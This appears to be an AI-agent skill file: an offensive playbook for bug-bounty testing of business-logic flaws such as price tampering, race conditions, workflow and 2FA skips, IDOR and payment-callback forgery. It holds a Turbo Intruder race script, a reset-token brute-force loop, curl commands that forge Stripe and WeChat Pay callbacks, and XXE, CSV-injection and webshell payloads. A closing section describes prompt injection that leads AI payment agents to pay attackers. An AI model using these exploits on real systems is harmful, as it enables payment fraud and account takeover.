# SKILL: Business Logic Vulnerabilities — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Business logic flaws are scanner-invisible and high-reward on bug bounty. This skill covers race conditions, price manipulation, workflow bypass, coupon/referral abuse, negative values, and state machine attacks. These require human reasoning, not automation. For specific exploitation techniques (payment precision/overflow, captcha bypass, password reset flaws, user enumeration), load the companion [SCENARIOS.md](./SCENARIOS.md). For the workflow approach itself (modeling → state machine → attack-surface matrix → human judgement) load [METHODOLOGY.md](./METHODOLOGY.md). For the per-module check items load [CHECKLIST.md](./CHECKLIST.md).

### Companion files

| File | When to load |
|---|---|
| [METHODOLOGY.md](./METHODOLOGY.md) | Need the 5-phase workflow, attack-surface 5×N matrix, human-judgement decision tree |
| [CHECKLIST.md](./CHECKLIST.md) | Going through a target module-by-module (login / register / payment / IDOR / privacy) and want every line item with why+verify |
| [SCENARIOS.md](./SCENARIOS.md) | Drilling deeper into payment precision/overflow, captcha bypass, password reset, enumeration, frontend bypass |

### Extended Scenarios

Also load [SCENARIOS.md](./SCENARIOS.md) when you need:
- Payment precision & integer overflow attacks — 32-bit overflow to negative, decimal rounding exploitation, negative shipping fees
- Payment parameter tampering checklist — price, discount, currency, gateway, return_url fields
- Condition race practical patterns — parallel coupon application, gift card double-spend with Burp group send
- Captcha bypass techniques — drop verification request, remove parameter, clear cookies to reset counter, OCR with tesseract
- Arbitrary password reset — predictable tokens (`md5(username)`), session replacement attack, registration overwrite
- User information enumeration — login error message difference, masked data reconstruction across endpoints, base64 uid cookie manipulation
- Frontend restriction bypass — array parameters for multiple coupons (`couponid[0]`/`couponid[1]`), remove `disabled`/`readonly` attributes
- Application-layer DoS patterns — regex backtracking, WebSocket abuse

## 1. PRICE AND VALUE MANIPULATION

### Negative Quantity / Price
Many applications validate "amount > 0" but not for currency:
```
Add to cart with quantity: -1
Update quantity to: -100
{
  "quantity": -5,
  "price": -99.99     ← may be accepted
}
```
**Impact**: Receive credit to account, items for free, bank transfers in reverse.

### Decimal Quantity — "0元购" Case
Real instructor-led case: an e-commerce app accepted **fractional `quantity`** because backend trusted client float values:
```json
// Cart item:
{"id": 114016, "skuQty": 0.02}
// Original price ¥500 → final price ¥10
// Variant on a food delivery app:
// FoodNum=0.01 → 68元 商品 实付 0.68元
```
Why it works: server multiplies `unit_price * quantity` without enforcing `quantity ∈ Z+`, so a 2% sliver order pays 2% price but ships the full item. Reproduce by intercepting the cart submit → setting `skuQty` / `FoodNum` to `0.02` → finishing checkout.

### Drop a Required Field — Free Tier Coercion
Sport activity registration: when paid prizes are involved server returns `"payType": "paid"`; if the client request is **edited to omit `prizeIdList` entirely**, the server falls back to `"payType": "free"` and creates a successful registration that should have cost money.
```json
// Original
{"prizeIdList": ["6264e6948fe587000113e2d9"], ...}
// Modified — array removed entirely
{"prizeIdList": [], ...}
// Server response:
{"ok": true, "payType": "free"}
```
This is a parameter-existence trust bug — backend treats "field absent" as "no paid item to enforce", so fix is to require the field and validate its content server-side.

### Integer Overflow
```
quantity: 2147483648   ← INT_MAX + 1 overflows to negative in 32-bit
price: 9999999999999   ← exceeds float precision → rounds to 0
```
Real case: setting `amount=999999999` triggered an overflow path where the system stored `0` as final payable. **Always coordinate before triggering overflow tests** — they sometimes crash payment services.

### Rounding Manipulation
```
Item price: $0.001
Order 1000 items → each rounds down → total = $0.00
```
Real "half-price recharge" bug: input `¥0.019` to top-up. The pay gateway charges only `¥0.01` (rounded down to the cent), but the wallet credits `¥0.02` (rounded up). Net gain per cycle is `¥0.01`, repeat for free balance growth.

### Currency Exchange Rate Lag
```
1. Deposit using currency A at rate X
2. Rate changes
3. Withdraw using currency A at new rate → profit from rate difference
```

### Free Upgrade via Promo Stacking
Test combining discount codes, referral credits, welcome bonuses:
```
Apply promo: FREE50  → 50% off
Apply promo: REFER10 → additional 10%
Apply loyalty points → additional discount
Total: -$5 (free + credit)
```

---

## 2. RACE CONDITIONS

**Concept**: Two operations run simultaneously before the first completes its check-update cycle.

### Double-Spend / Double-Redeem
```bash
# Send same request simultaneously (~millisecond apart):
# Use Burp Repeater "Send to Group" or Race Conditions tool:

POST /api/use-coupon    ← send 20 parallel requests
POST /api/redeem-gift   ← same coupon code, parallel
POST /api/withdraw-funds ← same balance, parallel

# If check and update are non-atomic:
# Thread 1: check(balance >= 100) → TRUE
# Thread 2: check(balance >= 100) → TRUE (before Thread 1 deducted)
# Thread 1: balance -= 100
# Thread 2: balance -= 100 → BOTH succeed → double-spend
```

### Race Condition Test with Burp Suite
```
1. Capture request
2. Send to Repeater → duplicate 20+ times
3. "Send group in parallel" (Burp 2023+)
4. Check: did any duplicate succeed?
```

### Turbo Intruder — Bypassing Per-Number SMS Rate Limit
Real case: when a normal request returns `"该号码短时间内申请发送短信次数过多，拒绝发送"`, sending the **same payload** with high concurrency through Turbo Intruder defeats the simple counter:
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=10,
                           pipeline=False)
    for i in range(30):
        engine.queue(target.req, target.baseInput, gate='race1')
    engine.openGate('race1')
```
Result: the per-phone limiter races and many requests slip through, generating multiple distinct verification codes (a real SMS-bombing case). Root cause: counter increment is non-atomic vs. the read.

### Multi-Device Concurrent VIP Subscription
Real case: a service offers **first-month-only discount**. Open the pay sheet on multiple devices (A, B, C) before any payment finishes, then complete each in sequence. Server only checks "is new user?" at the **first** request, so all subsequent requests inherit the discount AND the VIP duration stacks.
```
Normal: 下单 → 支付 → 充值会员 → 第二次下单 → 服务端校验 "已是新人" → 拒绝
Bypass: 设备A: 进入支付页 (锁定优惠资格)
        设备B: 进入支付页 (并发锁定)
        设备A: 完成支付 → VIP +1月 (优惠价)
        设备B: 完成支付 → VIP +1月 (仍按优惠价)
```
Same trick works on "补差价升级会员" — concurrent top-ups duplicate the duration credit.

### Account Registration Race
```
Register with same email simultaneously → two accounts created → data isolation broken
Password reset token race → reuse same token twice
Email verification race → verify multiple email addresses
```

### Limit Bypass via Race
```
"Claim once" discounts, freebies, "first order" bonus:
→ Send 10 parallel POST /claim requests
→ Race window: all pass the "already claimed?" check before any write
```

---

## 3. WORKFLOW / STEP SKIP BYPASS

### Payment Flow Bypass
```
Normal flow:
  1. Add to cart
  2. Enter shipping info
  3. Enter payment (card/wallet)
  4. Click confirm → payment charged
  5. Order confirmed

Attack: Skip to step 5 directly
POST /api/orders/confirm {"cart_id": "1234", "payment_status": "paid"}
→ Does server trust client-sent payment_status?
```

### Multi-Step Verification Skip
```
Password reset flow:
  1. Enter email
  2. Receive token
  3. Enter token
  4. Set new password (requires valid token from step 3)

Attack: Try going to step 4 without completing step 3:
POST /reset/password {"email": "victim@x.com", "token": "invalid", "new_pass": "hacked"}
→ Does server check that token was properly validated?

Or: Try token from old/expired flow → still accepted?
```

### 2FA Bypass
```
Normal flow:
  1. Enter username + password → success
  2. Enter 2FA code → logged in

Attack: After step 1 success, go directly to /dashboard
→ Is session created before 2FA completes?
→ Does /dashboard require 2FA-complete check or just "authenticated" flag?
```

### Filter Path Truncation Bypass — `..//` and `;`

Real case from a Java Web class audit: a manually-implemented Servlet `Filter` checks login by inspecting the URI string. Two reliable bypasses:

```
Path-traversal truncation (../):
  Protected:   http://target/FilterDemo/index.jsp        → 302 to /login
  Bypass:      http://target/FilterDemo/../../index.jsp  → 200 (filter sees "../../", URL parser collapses)

Semicolon truncation (;):
  Protected:   http://target/admin/doLogin.action        → 302 to /login
  Bypass:      http://target/;/admin/doLogin.action      → 200
                              ^
                              Servlet container treats segment after ; as "path parameter",
                              filter that uses request.getRequestURI() sees "/;/admin/doLogin.action",
                              doesn't match its protected-prefix "/admin/", lets the request through,
                              but the dispatcher then routes to the real /admin/doLogin.action handler.
```

**Fix**: never use `request.getRequestURI()` for security checks; use `request.getServletPath()` which is the normalized servlet-mapped path:
```java
// Vulnerable
String uri = request.getRequestURI();   // /;/admin/doLogin.action
// Safe
String path = request.getServletPath(); // /admin/doLogin.action
```

When auditing Java code, grep for `request.getRequestURI()` paired with `Filter`/`startsWith`/`indexOf("/admin")` patterns — those are immediate red flags.

### Real-Name Verification Replay-To-Reset

Fraudulent path that deliberately fails real-name authentication to **reopen** the editing flow:
```
1. Submit real-name auth with intentionally wrong cardNumber
   → server returns "code:200, msg:success, ok:true" but flow shows "驳回 / 等待审核"
2. Because the server marks state as "rejected" but doesn't lock the user, the UI lets the
   account go back into the "edit identity" state
3. Now resubmit with another (possibly stolen) identity
   → real-name binding repeats indefinitely, defeating anti-addiction lock and enabling account resale
```
Defense: rejected real-name submissions must lock the account / require human review, not loop back to the editor.

### Shipping Without Payment
```
  1. Add item to cart
  2. Enter shipping address
  3. Select payment method (credit card)
  4. Apply promo code (100% discount or gift card)  
  5. Final amount: $0
  6. Order placed

Attack: Apply 100% discount code → no actual payment processed → item ships
```

---

## 4. COUPON AND REFERRAL ABUSE

### Coupon Stacking
```
Test: Can you apply multiple coupon codes?
Test: Does "SAVE20" + promo stack to >100%?
Test: Apply coupon, remove item, keep discount applied, add different item
```

### Referral Loop
```
1. Create Account_A
2. Register Account_B with Account_A's referral code → both get credit
3. Create Account_C with Account_B's referral code
4. Ad infinitum with throwaway emails
→ Infinite credit generation
```

### Coupon = Fixed Dollar Amount on Variable-Price Item
```
Coupon: -$5 off any order
Buy item worth $3, use -$5 coupon → net -$2 (credit balance)
```

---

## 5. ACCOUNT / PRIVILEGE LOGIC FLAWS

### Email Verification Bypass
```
1. Register with email A (legitimate, verified)
2. Change email to B (attacker's email, unverified)
3. Use account as verified — does server enforce re-verification?

Or: Change email to victim's email → no verification → account claim
```

### Password Reset Token Binding
```
1. Request password reset for your account → get token
2. Change your email address (account settings)
3. Reuse old password reset token → does it still work for old email?

Or: Request reset for victim@target.com
    Token sent to victim but check: does URL reveal predictable token pattern?
```

### OAuth Account Linking Abuse
```
1. Have victim's email (but not their password)
2. Register with victim's email → get account with same email
3. Link OAuth (Google/GitHub) to your account
4. Victim logs in with Google → server finds email match → merges with YOUR account
```

### Cookie Replacement — Horizontal/Vertical Privilege Escalation

The textbook IDOR demo from the audit videos:
```
1. Login as super-admin → capture request, copy Cookie (JSESSIONID/Token)
2. Logout, login as plain user → capture another request to the SAME endpoint
3. Replay the plain-user request, but swap the Cookie value with the admin's token
4. If the response returns admin-only data → vertical escalation
   If it returns another-user's data → horizontal escalation
```
A common companion bug: `/oa/emp/list` returns **HTTP 302 to /login when no cookie**, but **200 with full data when any plain-user cookie is sent** — meaning the only check is "logged in?", not "authorized for this endpoint".

### Permission Residue from Database Inconsistency

A subtle case from the second audit class: the admin UI shows that role X has had permission `user:list` revoked, but querying the SQL data:

```sql
SELECT * FROM sys_menu WHERE role_id = 2;
-- two rows for the same menu_id "user:list"
```

The UI's "remove permission" only deleted ONE row; the duplicate row keeps the API accessible. Verify by:
```sql
SELECT menu_id, COUNT(*) FROM sys_menu GROUP BY menu_id, role_id HAVING COUNT(*) > 1;
```

Lesson: when a UI says permission revoked but API still works → check the underlying RBAC table for duplicates / orphaned grants.

### Weak-Random Password Reset Token

PHP / legacy stack on Windows uses `rand()` whose `RAND_MAX = 32768`. If a reset link uses
`/resetpassword.php?id=md5(rand())`, the entire keyspace is precomputable:
```php
$a = 0;
for ($a = 0; $a <= 32768; $a++) {
    $b = md5($a);
    echo $b . "\r\n";
}
```
Iterate the resulting dictionary against `/resetpassword.php?id=<hash>` — when one returns a valid reset page you can change the victim's password. Audit any token generation that ultimately calls `rand()`, `mt_rand()` (without seeding), `Random()` (default seed in C#), etc.

---

## 6. API BUSINESS LOGIC FLAWS

### Object State Manipulation
```
order.status = "pending"
→ PUT /api/orders/1234 {"status": "refunded"}   ← self-trigger refund
→ PUT /api/orders/1234 {"status": "shipped"}    ← mark as shipped without shipping
```

### Transaction Reuse
```
1. Initiate payment → get transaction_id
2. Complete purchase
3. Reuse same transaction_id for second purchase:
   POST /api/checkout {"transaction_id": "USED_TX", "cart": "new_cart"}
```

### Limit Count Manipulation
```
Daily transfer limit = $1000
→ Transfer $999, cancel, transfer $999 (limit not updated on cancel)
→ Parallel transfers (race condition on limit check)
→ Different payment types not sharing limit counter
```

### Java Web "No Filter, No Spring Security" Anti-Pattern

Audit-friendly tell: a Spring Boot project that does **NOT** include `spring-boot-starter-security` and has zero `Filter` classes. This means every controller is wide-open for `guest` unless the developer manually checked the session in each method. Reproduce:
```bash
# Inside the source tree
find . -name "*.java" -exec grep -l "Filter" {} \;     # likely empty
find . -name "*.java" -exec grep -l "@PreAuthorize\|@Secured" {} \;
```
If both are empty, expect almost every API to be unauthorized. From the audit demo:
```java
public Result score(@RequestParam("userId") Integer userId) {
    Score score = scoreService.selectScoreByUserId(userId);
    return Result.success(score);
}
```
No check that `userId` matches the session's logged-in user → horizontal IDOR. Worse: the same endpoint works **without any Cookie**, since nothing forces authentication globally.

### Spring Security `antMatchers` Coverage Gap

The audit videos also showed a partially-secured Spring Security config like:
```java
.antMatchers("/system/user/info").authenticated()
.antMatchers("/system/menu/**").hasRole("admin")
```
A common error is an over-narrow rule — e.g. `/system/user/info` is protected but `/system/user/list` is not, or `/system/menu/**` is admin-only but `/system/dept/treeData` is open. Cross-check the controller annotations (`@PreAuthorize("@ss.hasPermi('system:user:list')")`) against the SecurityConfig — every annotated endpoint must also map to a SecurityConfig rule. Mismatches are common after refactors.

---

## 7. SUBSCRIPTION / TIER CONFUSION

```
Free tier: cannot access feature X
Paid tier: can access feature X

Attack: 
- Sign up for paid trial → enable feature X → downgrade to free
  → Does feature X get disabled on downgrade? 
  → Can you continue using feature X?

Or:
- Inspect premium endpoint list from JS bundle
- Directly call premium endpoints with free account token
→ Server checks subscription for UI but not API?
```

### Direct Media URL Leak — VIP Resource Bypass

Real cases from a fitness/learning app: when the client requests course detail, the JSON response embeds the raw media URL:
```http
GET /gerudo/v2/liveCourse/625020ce8f002700010554c1/detail HTTP/1.1
{
  "previewPullUrl": "http://app-live.../live/app-live_625020ce8f002700010554c2_Preview.flv"
  ...
}
```
Search **all** detail / preview / playback responses for keywords:
```
.flv  .m3u8  .mp4  .mp3  videoUrl  downloadUrl  streamUrl  previewPullUrl
```
For each hit, replay the URL anonymously (curl, VLC, flv.js demo at `https://bilibili.github.io/flv.js/demo/`). If the URL plays without a session, you've broken VIP gating. Defense: use signed, short-TTL URLs bound to user/IP/Referer, not raw resource paths.

### Resource ID Replacement — Free → Paid Course

Companion bug: free course detail returns `{"id": "60caa21e853f5c1651b27c1b", ...}`. Replace the ID in the URL with a known paid course ID. If the response structure remains the same and includes the playable URL → IDOR on premium content. Defense: verify the **owner relation** on each detail call, not just "is logged-in".

---

## 8. FILE UPLOAD BUSINESS LOGIC

For the full upload attack workflow beyond pure logic flaws, also load:

- [file-access-vuln](../file-access-vuln/SKILL.md): route upload validation, storage, preview, and processing-chain issues before pivoting into specific exploit categories

```
Upload size limit: 10MB
→ Upload 10MB → compress client-side → server decompresses → bomb?
(Zip bomb: 1KB zip → 1GB file = denial of service)

Upload type restriction:
→ Upload .csv for "data import" → inject formulas: =SYSTEM("calc")
  (CSV injection in Excel macro context)
→ Upload avatar → server converts → attack converter (ImageMagick, FFmpeg CVEs)

Storage path prediction:
→ /uploads/USER_ID/filename
→ Can you overwrite other user's file by knowing their ID + filename?
```

---

## 9. TESTING APPROACH

```
For each business process:
1. Map the INTENDED flow (happy path)
2. Ask: "What if I skip step N?"
3. Ask: "What if I send negative/zero/MAX values?"
4. Ask: "What if I repeat this step twice?" (idempotency)
5. Ask: "What happens if I do A then B instead of B then A?"
6. Ask: "What if two users do this simultaneously?"
7. Ask: "Can I modify the 'trusted' status fields?"
8. Think from financial/resource impact angle → highest bounty
```

For the formal 5-phase workflow — Business Modeling → State Machine → Attack-Surface Matrix → Checklist-Driven Testing → Human Judgement — load **[METHODOLOGY.md](./METHODOLOGY.md)**. It includes a single-page decision tree (`Q1 ~ Q7`) for "I'm staring at a request and don't know what to try first".

---

## 10. HIGH-IMPACT CHECKLISTS

For the full per-module list (login / register / password recovery / payment / coupon / order / IDOR / privacy / VIP / URL redirect / cookie & token / race / comments) with `why` and `verify` columns — load **[CHECKLIST.md](./CHECKLIST.md)**.

The condensed top-impact items below are the "if you have only 30 minutes, hit these first" set:

### E-commerce / Payment
```
□ Negative quantity / decimal quantity (skuQty=0.02, FoodNum=0.01) in cart
□ Drop required fields (delete prizeIdList) to coerce free tier
□ amount=999999999 integer overflow → final 0
□ Apply multiple conflicting coupons via array params
□ Race condition: double-spend gift card / same coupon
□ Skip payment step directly to order confirmation  
□ Server-trusted client status fields (payment_status=paid, success:true)
□ Refund without return (trigger refund on delivered item via state change)
□ Multi-device concurrent VIP subscription / 补差价升级
□ Currency rounding exploitation (¥0.019 charge → ¥0.02 wallet credit)
```

### Authentication / Account
```
□ 2FA bypass by direct URL access after password step
□ Filter bypass: ../../path traversal truncation, ;path-parameter truncation
□ Password reset token reuse after email change
□ Weak random reset token: md5(rand()) on Windows PHP, predictable seed
□ Email verification bypass (change email after verification)
□ OAuth account takeover via email match
□ Register with existing unverified email
□ Cookie replacement (admin → user / user → another user)
□ Real-name verification "故意填错" replay-to-reset
```

### Subscriptions / Limits / Resources
```
□ Access premium features after downgrade
□ Exceed rate/usage limits via parallel requests (Turbo Intruder)
□ Referral loop for infinite credits
□ Free trial ≠ time-limited (no enforcement after trial)
□ Direct API call to premium endpoint without subscription check
□ Free-course ID swap to paid-course ID (IDOR on resource)
□ Direct media URL exposure in JSON (.flv / .m3u8 / .mp4 in response)
□ Server-side RBAC residue (sys_menu duplicate rows)
□ Java Web no-Filter / Spring Security antMatchers gap
```

## 11. CONSOLIDATED CHECKLIST (2-Hour Full Sweep)

The Section 10 list is the "30-minute money grab". This list is the next layer:
when you have a couple of hours and want a defensive-grade sweep across all
nine business surfaces. It's organized by surface, then by attack mechanism
inside the surface, so you can read a column-down for "what classes of bug
might exist on this endpoint" and a row-across for "where else does this
attack apply".

For full `item / why / verify` triplets including reproduction steps and
tooling per item, load **[CHECKLIST.md](./CHECKLIST.md)**. This section
keeps only the item line for fast scanning.

### 11.1 Login / Authentication
```
□ Username enumeration via response diff (msg / status code / timing)
□ Username enumeration via SMS-send response (sent vs not-registered)
□ Brute force without lockout (no rate limit on failed login)
□ Default / weak credentials (admin/admin, root/123456) on backend & infra
□ 2FA bypass via direct URL after password step / replay 2FA token
□ Client-trusted login flag (status=success, is_login=true in response body)
□ Third-party / SSO callback IDOR (modify uid in callback to take over)
□ Biometric liveness bypass (replay static photo / pre-recorded video)
□ Open redirect in login/register (return_url, redirect, callback param)
□ Hardware-key signature replay / forgery (USB-Key, PKI cert)
```

### 11.2 Registration
```
□ Username / phone / email enumeration via "already exists" response
□ Password strength only enforced client-side (set 123456 server-side)
□ Skip multi-step registration (POST final step directly, miss email verify)
□ Verification code not enforced (empty / random / fixed value passes)
□ SMS / email code replay (same code used twice or across users)
□ Re-register same username after logout, inherit old data / privileges
□ Anti-fraud bypass via N similar virtual accounts (same device, diff email)
□ Mass-register replay-protection missing (no nonce on submit step)
```

### 11.3 Password Recovery / Reset
```
□ Reset target tampering (uid / email / phone in submit step)
□ Reset token predictable (timestamp-derived, weak hash, short random)
□ Cross-user token reuse (A's reset_token, change B's password)
□ Old-password check missing on logged-in change-password endpoint
□ Skip code-verify step, hit final reset endpoint directly
□ Reset link / answer / token leaked in HTML or JS source
□ Reset token has no expiry / not invalidated after use
□ Reset code base64-only "obfuscated" in response
□ Inconsistent identity across multi-step flow (reset_token from step 2
  reusable in step 4)
□ Old session not revoked after email/phone re-bind
```

### 11.4 Session / Token
```
□ Session fixation: pre-login session id remains valid after login
□ Token not bound to user/IP/device (steal cookie → use anywhere)
□ Forged token: weak algorithm md5(username + timestamp), no server salt
□ Stale token still accepted after logout / expiry (no blacklist)
□ Cookie tampering (uid / role / is_admin in cookie trusted server-side)
□ State-machine replay (replay "claim red packet" → re-claim)
□ Anti-replay missing on one-time tokens (CSRF token, OTP, nonce)
□ Sensitive credentials (token, answer, key) hardcoded in front-end JS
□ Privileged session created from public Session ID without re-auth
□ Token works cross-environment (different IP, different UA, no validation)
```

### 11.5 Payment / Order
```
□ Amount tampering: amount = 0.01 / 0 / negative / 0.001
□ Quantity tampering: quantity = -1 / 0.01 / 1.5 / 999999999
□ Integer overflow: quantity * price wraps to 0 or negative
□ Floating-point precision exploit (multi-decimal, accumulated rounding)
□ Currency code swap (CNY → JPY/RUB at same numeric value)
□ Coupon / discount field forge (coupon_id, discount=, free_shipping=true)
□ Item ID swap: replace product_id with cheaper SKU at checkout
□ Signature / sign-field bypass (drop sign param, use stale sign)
□ Payment-callback forgery (status=paid posted to internal callback)
□ Replay paid request → multiple shipments / multiple credit
□ Race / concurrency: oversell, double-spend gift card, double redeem coupon
□ Refund without losing the merchandise / virtual rights
□ VIP duration tampering (days=999, months=120, period=-1)
□ Receiver-account redirect (merchant_id / receiver_account swap on withdraw)
□ Negative shipping / fee fields decreasing total (shipping_fee = -500)
□ Concurrent topup-then-refund draining (refund > topup in race window)
□ Pricing rule transition window (price changes at T, replay at T-ε with old rule)
□ Currency rounding micro-arbitrage (charge 0.019 → wallet credit 0.02)
□ Multi-channel inconsistency (online vs cash-on-delivery vs balance pay)
```

### 11.6 IDOR / Authorization
```
□ Horizontal IDOR: uid / order_id / resource_id swap to victim's
□ Vertical IDOR: role / type / level field set to admin in request
□ Hidden field tampering (data-user-id in HTML / JS state)
□ Email / phone re-bind without verifying old binding
□ UID vs session-token consistency missing (token belongs to A, uid sent as B)
□ Predictable / sequential resource IDs (gift IDs, share-link IDs)
□ Resource enumeration on order / coupon / share / trip-detail endpoint
□ Multi-entry inconsistency: web blocks, mobile API doesn't
□ State-machine illegal transition (claim reward without paying / shipping
  before order paid)
□ Hidden / undocumented admin endpoint accessible without admin auth
□ Cross-role function call (user calls merchant API, rider API, etc.)
□ Privilege via concurrent action (request role-elevation race condition)
```

### 11.7 CAPTCHA / Verification Code
```
□ Code returned in plaintext in HTTP response (body / header / JS var)
□ Receiver tampering: change phone / email param to attacker-controlled
□ Empty / fixed code accepted (000000, blank, "test")
□ Drop the code field entirely → request still succeeds
□ Cross-account reuse (A's valid code accepted on B's flow)
□ One-time enforcement missing (same code reusable until expiry)
□ Brute force 4-6 digit code (no attempt limit, no lockout)
□ SMS / email bombing (no rate limit per IP / per phone / no graphical CAPTCHA)
□ Front-end-only "send-success" status (server says fail, FE says success)
□ Code not bound to session (code generated for A, used in B's session)
```

### 11.8 File Upload
```
□ Content-Type bypass (Content-Type: image/jpeg, body is PHP)
□ Extension trick: double ext (.php.jpg), case mix (.Php), null byte, ;path
□ Filename path traversal (filename=../../webshell.php)
□ File-content polyglot (image with embedded PHP / shell)
□ Office XML repack (unzip docx → inject XML → rezip → upload)
□ XXE via .xml / .dtd upload endpoint
□ Backend-only upload (admin login → upload → exec)
□ Upload race: upload + parallel access before AV scan / cleanup
□ ZIP bomb (1KB → 1GB on server, decompress DoS)
□ CSV formula injection (=SYSTEM("calc"), =cmd|'/c calc'!A1)
□ Storage path predictable / overwritable across users (/uploads/UID/file)
□ Image converter / parser CVE (ImageMagick, FFmpeg, pillow)
```

### 11.9 CSRF / SSRF / XXE
```
□ XXE file read (<!ENTITY x SYSTEM "file:///etc/passwd">)
□ XXE blind via OOB (parameter entity → DNSLog / Burp Collaborator)
□ SSRF via image-import / webhook / preview URL (file://, http://127.0.0.1)
□ SSRF via FTP / gopher / jar / php-wrapper / dict protocols
□ XML parser dangerous wrappers enabled (php://expect, expect://)
□ Out-of-band detection for blind injection (DNSLog confirms server hit)
□ CSRF on state-changing endpoint (no token, no SameSite, no origin check)
□ Payment / withdrawal CSRF via auto-submitting hidden form
□ Login CSRF (force victim to log into attacker account)
□ JSONP / JSONP-callback exploitation as CSRF read primitive
```

### How to Use This Section

1. Print or screenshot the relevant 1-2 sub-sections for the target's surface.
2. For each `□` mark: NOT-APPLICABLE / NOT-VULN / VULN / NEEDS-RECHECK.
3. Mark the EXACT endpoint + parameter + payload that proved the bug
   (or proved it absent), so the report is reproducible.
4. Cross-reference with `METHODOLOGY.md` Q1~Q7 decision tree when an item
   triggers something unexpected — the tree tells you which neighboring
   items are likely also vulnerable.
5. For deep payloads / curl-ready commands / Burp screenshots per item,
   load `CHECKLIST.md` (full triplets) and `SCENARIOS.md` (real cases).

## 12. 2026 EMERGING TECHNIQUES — Payment Callback Forgery & AI Payment Abuse

> 2026's payment attack surface expanded along two axes: (1) classic callback
> forgery reached new severity with empty-key HMAC, missing-header-bypass, and
> cross-gateway fulfillment; (2) AI agents that can spend money autonomously
> created an entirely new attack class. All CVEs below are real 2026 disclosures.

### 12.1 Empty Webhook Secret → Deterministic HMAC Bypass

**CVE-2026-41432 — New API (LLM gateway) Stripe Webhook Forgery (CVSS 8.2)**

Triple-stacked flaw in a popular LLM API gateway's Stripe integration:

1. `StripeWebhookSecret` defaults to **empty string**. The Stripe Go SDK
   `webhook.ConstructEventWithOptions` does NOT reject an empty key — it
   computes HMAC-SHA256 with an empty key, producing a **deterministic,
   attacker-computable signature** (CWE-1188 insecure default).
2. `sessionCompleted` checks only `status == "complete"`, **not**
   `payment_status == "paid"` — so delayed payments (bank transfer, SEPA,
   Boleto) or 100%-discount `no_payment_required` events are treated as paid.
3. **Cross-gateway fulfillment**: `Recharge()` looks up orders by `trade_no`
   alone, without checking that `PaymentMethod == stripe`. Attacker creates an
   order via Epay, then completes it with a forged Stripe webhook (CWE-863).

```bash
# Forge a Stripe webhook event with empty-secret HMAC:
# The signature is deterministic because the key is ""
payload='{"type":"checkout.session.completed","data":{"object":{"status":"complete","client_reference_id":"ORDER_123"}}}'
sig=$(echo -n "$payload" | openssl dgst -sha256 -hmac "" | sed 's/.* //')
curl -X POST https://target/api/stripe/webhook \
  -H "Stripe-Signature: t=999,v1=$sig" \
  -d "$payload"
# → order marked paid, no real payment
```

Fixed in v0.12.10. Mitigation: set webhook secret to any non-empty value, or
Nginx-deny `/api/stripe/webhook` [strophes.co].

### 12.2 Missing Signature Header → Unconditional Bypass

**CVE-2026-33661 — yansongda/pay WeChat Pay Callback Bypass (CVSS 8.6)**

The widely-used PHP payment SDK `yansongda/pay` (composer package) has
`verify_wechat_sign()` in `src/Functions.php` that **unconditionally skips all
RSA signature verification when the PSR-7 request host is `localhost`**.

```bash
# Bypass WeChat Pay signature verification:
curl -X POST https://target/pay/wechat/notify \
  -H "Host: localhost" \
  -H "Content-Type: application/json" \
  -d '{"out_trade_no":"ORDER_123","trade_state":"SUCCESS",...}'
# → verify_wechat_sign() sees Host: localhost → skips ALL checks → order paid
```

Fixed in v3.7.20. Affects every PHP system using this SDK for WeChat Pay
[cveinfo.com].

**CVE-2026-1305 — Japanized for WooCommerce (Paidy) Webhook (CVSS 5.3)**

`paidy_webhook_permission_check` returns **`true` unconditionally when the
Paidy signature header is absent** — missing means "allow" instead of "deny".
Attacker POSTs to the webhook endpoint without any signature header → order
status changes to "Processing"/"Completed" [freshysites.com].

### 12.3 Scale: 1,542 Stripe Webhooks Without Verification

Security research scanned 6,000 web apps and found **1,542 apps that do not
correctly verify Stripe webhook signatures**. Sending a forged
`checkout.session.completed` to the generic webhook endpoint triggers a
false payment event [cyberhub.blog]. AI-generated webhook handlers frequently
omit verification entirely or parse JSON before verifying (breaking the
signature) [hooklistener.com].

### 12.4 2026 Payment CVE Quick Reference

| CVE | Product | Flaw | CVSS |
|---|---|---|---|
| CVE-2026-41432 | New API (Stripe webhook) | Empty-key HMAC + missing payment_status check + cross-gateway | 8.2 |
| CVE-2026-33661 | yansongda/pay (WeChat Pay) | Host:localhost bypasses RSA verify | 8.6 |
| CVE-2026-1305 | WooCommerce Paidy | Missing sig header → return true | 5.3 |
| CVE-2026-9028 | CorvusPay WooCommerce | Unauthorized order cancellation | medium |
| CVE-2026-49072 | WooCommerce Anti-Fraud | Missing authorization (CWE-862) | critical |
| CVE-2026-47100 | FunnelKit Checkout | Unauth Stored XSS on checkout page | — |
| — | WooCommerce Payments | Auth bypass + privilege escalation | 9.8 |

### 12.5 USDT / Crypto Payment Forgery (2026)

- **Fake contract tokens**: anyone can deploy a token named "USDT" and send it
  to a wallet; balance shows normally but cannot be transferred. Must verify
  the official TRC20/ERC20/BEP20 contract address [gtokentool.com].
- **EPUSDT + dujiaoka integration**: EPUSDT is an open-source USDT payment
  middleware that integrates with dujiaoka. If the callback doesn't verify
  on-chain transaction authenticity, forged payment confirmations are possible
  [kdniao.csdn.net].
- **Confirmation blind spot**: USDT is a multi-chain token contract (not a
  native coin), so confirmation logic depends on contract address + block
  confirmations — a high-frequency forgery vector [gtokentool.com].

### 12.6 AI Agent Payment Abuse — The New 2026 Attack Class

**x402 Protocol Autonomous Payment Hijacking (Coinbase)**

x402 revives HTTP 402 "Payment Required" so AI agents can pay with stablecoins
without API keys or checkout flows — over 50M transactions processed.

```
Attack chain:
1. Attacker poisons llms.txt / markdown consumed by the agent
2. Hidden instruction hijacks the agent's goal
3. Agent is guided to a malicious service returning x402 payment requests
4. Agent autonomously pays the attacker's wallet
5. To the payment infra these look "legitimate" (within limits, valid delegation)
```

**LLM Router Injection → $500K Wallet Drained (2026-04-13, CoinDesk)**

26 LLM routers were injected with malicious tool calls, draining a customer's
$500K wallet. Four attack types: payload injection, goal hijacking, delegation
abuse, scope escalation [agentpaytrend.com].

**Embedded PayPal Transfer Instructions in Web Pages**

Agents parse web pages/HTML comments/metadata and find complete payment
instructions (e.g. "$5,000 PayPal transfer to attacker URL, step-by-step guide")
that they execute as legitimate commands [lyrie.ai]. UC Davis research: **94.4%
of frontier LLM agents are susceptible to prompt injection** — when agents can
spend money, impact escalates from data leak to wallet drain [1-sec.dev].

